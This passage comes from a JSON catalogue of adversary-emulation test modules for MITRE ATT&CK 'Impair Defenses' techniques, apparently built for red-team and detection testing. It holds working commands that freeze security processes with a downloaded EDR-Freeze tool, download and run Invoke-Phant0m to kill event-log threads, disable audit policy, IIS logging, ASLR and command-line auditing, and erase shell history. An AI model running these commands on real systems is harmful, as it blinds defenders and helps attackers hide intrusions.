false;\n\n        long luid;\n        if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid))\n            return false;\n\n        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();\n        tp.PrivilegeCount = 1;\n        tp.Luid = luid;\n        tp.Attributes = SE_PRIVILEGE_ENABLED;\n\n        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);\n    }\n}\n\"@\n\n$result = [TokenAdjuster]::EnableSeDebugPrivilege()\nif ($result) {\n    Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green\n} else {\n    Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red\n    exit 1\n}\n\n# Get basic process info\n$process = Get-Process -Name $#{processName} -ErrorAction Stop\n$processName = $process.ProcessName\nWrite-Host \"Process Name: $processName)\"\nWrite-Host \"PID: $($process.Id)\"\n        \n# Get executable path and user info\n$query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"\n$wmiProcess = Get-WmiObject -Query $query\n\n$owner = $wmiProcess.GetOwner()\n    Write-Host \"User: $($owner.Domain)\\$($owner.User)\"\n\n\n# Get the folder of the current script\n$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition\n\n# Download latest EDR-Freeze package and extract (force replace)\n$downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"\n$zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"\nWrite-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan\ntry {\n    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop\n    Write-Host \"Download completed: $zipPath\" -ForegroundColor Green\n    $extractFolder = $scriptFolder\n    if (Test-Path $zipPath) {\n        Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan\n        if (Test-Path $extractFolder) {\n            # Ensure target exe not locked; attempt to stop any running instance silently\n            Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\n        }\n        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null\n        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)\n        $archive = $null\n        try {\n            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)\n            foreach ($entry in $archive.Entries) {\n                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }\n                if ($entry.FullName.EndsWith('/')) { # directory entry\n                    $dirPath = Join-Path $extractFolder $entry.FullName\n                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }\n                    continue\n                }\n                $destPath = Join-Path $extractFolder $entry.FullName\n                $destDir = Split-Path $destPath -Parent\n                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }\n                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }\n                try {\n                    # Use static extension method (PowerShell 5.1 compatible)\n                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)\n                } catch {\n                    Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow\n                }\n            }\n            Write-Host \"Extraction completed.\" -ForegroundColor Green\n        } finally {\n            if ($archive) { $archive.Dispose() }\n        }\n    }\n} catch {\n    Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red\n}\n\n# Wait 15s before putting targeted process before putting it in the comma\nWrite-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 3\nWrite-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 2\n\n# Put targeted  process in the comma for 15s\n# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)\n$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |\n    Sort-Object LastWriteTime -Descending |\n    Select-Object -First 1 -ExpandProperty Name\nif (-not $edrFreezeExeName) {\n    Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red\n    exit 1\n}\n\n$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName\nWrite-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan\nWrite-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow\nStart-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $edrFreezeExe\""
      },
      "variables": [
        {
          "name": "processName",
          "description": "PPL-protected process name to target",
          "type": "string",
          "default_value": "SecurityHealthService"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cbb2573a-a6ad-4c87-aef8-6e175598559b",
      "module_name": "Freeze PPL-protected process with EDR-Freeze"
    },
    {
      "index": 1558,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Detects Execution of the `sysctl` command to set `kernel.randomize_va_space=0` which disables Address Space Layout Randomization (ASLR) in Linux.",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sysctl -w kernel.randomize_va_space=0\n",
        "elevation_required": true,
        "cleanup_command": "sysctl -w kernel.randomize_va_space=2\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ac333fe1-ce2b-400b-a117-538634427439",
      "module_name": "Disable ASLR Via sysctl parameters - Linux"
    },
    {
      "index": 1559,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n",
        "elevation_required": false,
        "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n"
      },
      "variables": [
        {
          "name": "website_name",
          "description": "The name of the website on a server",
          "type": "string",
          "default_value": "Default Web Site"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "69435dcf-c66f-4ec0-a8b1-82beb76b34db",
      "module_name": "Disable Windows IIS HTTP Logging"
    },
    {
      "index": 1560,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n",
        "elevation_required": false,
        "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n"
      },
      "variables": [
        {
          "name": "website_name",
          "description": "The name of the website on a server",
          "type": "string",
          "default_value": "Default Web Site"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a957fb0f-1e85-49b2-a211-413366784b1e",
      "module_name": "Disable Windows IIS HTTP Logging via PowerShell"
    },
    {
      "index": 1561,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
        "elevation_required": true,
        "cleanup_command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "41ac52ba-5d5e-40c0-b267-573ed90489bd",
      "module_name": "Kill Event Log Service Threads"
    },
    {
      "index": 1562,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n",
        "elevation_required": true,
        "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5102a3a7-e2d7-4129-9e45-f483f2e0eea8",
      "module_name": "Impair Windows Audit Log Policy"
    },
    {
      "index": 1563,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "auditpol /clear /y\nauditpol /remove /allusers\n",
        "elevation_required": true,
        "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "913c0e4e-4b37-4b78-ad0b-90e7b25010f6",
      "module_name": "Clear Windows Audit Policy Config"
    },
    {
      "index": 1564,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wevtutil sl \"#{log_name}\" /e:false\n",
        "elevation_required": false,
        "cleanup_command": "wevtutil sl \"#{log_name}\" /e:true\n"
      },
      "variables": [
        {
          "name": "log_name",
          "description": "Name of the log to be disabled",
          "type": "string",
          "default_value": "Microsoft-Windows-IKE/Operational"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b26a3340-dad7-4360-9176-706269c74103",
      "module_name": "Disable Event Logging with wevtutil"
    },
    {
      "index": 1565,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{file_name}\"\n",
        "elevation_required": false,
        "cleanup_command": "echo \"Sorry you have to reboot\"\n"
      },
      "variables": [
        {
          "name": "file_name",
          "description": "exe version of Phant0m",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1562.002\\bin\\Phant0m.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Phant0m.exe must exist on disk at specified location (#{file_name})\n",
          "check_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1562.002/bin/Phant0m.exe\" -OutFile \"#{file_name}\" -UseBasicParsing\n"
        }
      ],
      "rx_module_id": "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741",
      "module_name": "Makes Eventlog blind with Phant0m"
    },
    {
      "index": 1566,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore ",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "ChannelPath",
          "description": "Path to the event log service channel to alter",
          "type": "string",
          "default_value": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-TaskScheduler/Operational"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8e81d090-0cd6-4d46-863c-eec11311298f",
      "module_name": "Modify Event Log Channel Access Permissions via Registry - PowerShell"
    },
    {
      "index": 1567,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path #{ChannelPath} -Force\nSet-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path #{ChannelPath} -Force\nRestart-Service -Name EventLog -Force -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "ChannelPath",
          "description": "Path to the event log service channel to alter",
          "type": "string",
          "default_value": "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\Setup"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "85e6eff8-3ed4-4e03-ae50-aa6a404898a5",
      "module_name": "Modify Event Log Channel Access Permissions via Registry 2 - PowerShell"
    },
    {
      "index": 1568,
      "technique_id": "T1562.002",
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "description": "This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the \"CustomSD\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\""
      },
      "variables": [
        {
          "name": "CustomSDPath",
          "description": "Path to the event log service channel to alter",
          "type": "string",
          "default_value": "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a0cb81f8-44d0-4ac4-a8f3-c5c7f43a12c1",
      "module_name": "Modify Event Log Access Permissions via Registry - PowerShell"
    },
    {
      "index": 1569,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "Disables history collection in shells\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "export HISTCONTROL=ignoreboth\n#{evil_command}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "evil_command",
          "description": "Command to run after shell history collection is disabled",
          "type": "string",
          "default_value": "whoami"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4eafdb45-0f79-4d66-aa86-a3e2c08791f5",
      "module_name": "Disable history collection"
    },
    {
      "index": 1570,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "Disables history collection in shells\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "export HISTSIZE=0\n#{evil_command}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "evil_command",
          "description": "Command to run after shell history collection is disabled",
          "type": "string",
          "default_value": "whoami"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cada55b4-8251-4c60-819e-8ec1b33c9306",
      "module_name": "Disable history collection (freebsd)"
    },
    {
      "index": 1571,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "The HISTCONTROL variable is set to ignore (not write to the history file) command that are a duplicate of something already in the history \nand commands that start with a space. This raglox sets this variable in the current session and also writes it to the current user's ~/.bash_profile \nso that it will apply to all future settings as well.\nhttps://www.linuxjournal.com/content/using-bash-history-more-efficiently-histcontrol\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "468566d5-83e5-40c1-b338-511e1659628d",
      "module_name": "Mac HISTCONTROL"
    },
    {
      "index": 1572,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi\n",
        "elevation_required": false,
        "cleanup_command": "mv -f $HISTFILE.OLD $HISTFILE \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "878794f7-c511-4199-a950-8c28b3ed8e5b",
      "module_name": "Clear bash history"
    },
    {
      "index": 1573,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi\n",
        "elevation_required": false,
        "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "10ab786a-028e-4465-96f6-9e83ca6c5f24",
      "module_name": "Setting the HISTCONTROL environment variable"
    },
    {
      "index": 1574,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n",
        "elevation_required": false,
        "cleanup_command": "export HISTCONTROL=$(echo $TEST)\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5cafd6c1-2f43-46eb-ac47-a5301ba0a618",
      "module_name": "Setting the HISTFILESIZE environment variable"
    },
    {
      "index": 1575,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An Adversary may set the sh history files size environment variable (HISTSIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTSIZE. In this test we 1. echo HISTSIZE 2. set it to zero 3. confirm that HISTSIZE is set to zero.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo $HISTSIZE\nexport HISTSIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTSIZE) -eq 0 ]; then echo \"\\$HISTSIZE is zero\"; else HIST_LENGTH=$(wc -l $HISTFILE); echo \"\\$HISTSIZE is not zero, history size is $HIST_LENGTH\";  fi\n",
        "elevation_required": false,
        "cleanup_command": "export HISTSIZE=100\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "386d3850-2ce7-4508-b56b-c0558922c814",
      "module_name": "Setting the HISTSIZE environment variable"
    },
    {
      "index": 1576,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "TEST=$(echo $HISTFILE)\necho $HISTFILE\nexport HISTFILE=\"/dev/null\"\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT\";  fi\n",
        "elevation_required": false,
        "cleanup_command": "export HISTFILE=$(echo $TEST)\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b3dacb6c-a9e3-44ec-bf87-38db60c5cad1",
      "module_name": "Setting the HISTFILE environment variable"
    },
    {
      "index": 1577,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo $HISTFILE\nexport HISTFILE=\"/dev/null\"\nif [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi\n",
        "elevation_required": false,
        "cleanup_command": "export HISTFILE=~/.sh_history\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f7308845-6da8-468e-99f2-4271f2f5bb67",
      "module_name": "Setting the HISTFILE environment variable (freebsd)"
    },
    {
      "index": 1578,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\nunset HISTIGNORE\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi\n",
        "elevation_required": false,
        "cleanup_command": "unset HISTIGNORE\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f12acddb-7502-4ce6-a146-5b62c59592f1",
      "module_name": "Setting the HISTIGNORE environment variable"
    },
    {
      "index": 1579,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
      "description": "In Windows operating systems, command line auditing is controlled through the following registry value:\n\n  Registry Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\n  \n  Registry Value: ProcessCreationIncludeCmdLine_Enabled\n\nWhen command line auditing is enabled, the system records detailed information about command execution, including the command executed, the user account responsible for executing the command, and the timestamp of the execution.\nThis information is crucial for security monitoring and forensic analysis, as it helps organizations detect and investigate unauthorized or malicious activities within their systems.\nBy default, command line auditing may not be enabled in Windows systems, and administrators must manually configure the appropriate registry settings to activate it.\nConversely, attackers may attempt to tamper with these registry keys to disable command line auditing, as part of their efforts to evade detection and cover their tracks while perpetrating malicious activities.\n\nBecause this attack executes reg.exe using a command prompt, this attack can be detected by monitoring both:\n  Process Creation events for reg.exe (Windows Event ID 4688, Sysmon Event ID 1)\n  Registry events (Windows Event ID 4657, Sysmon Event ID 13)\n\nRead more here:\nhttps://securitydatasets.com/notebooks/raglox/windows/defense_evasion/SDWIN-220703123711.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1329d5ab-e10e-4e5e-93d1-4d907eb656e5",
      "module_name": "Disable Windows Command Line Auditing using reg.exe"
    },
    {
      "index": 1580,
      "technique_id": "T1562.003",
      "technique_name": "Impair Defenses: Impair Command History Logging",
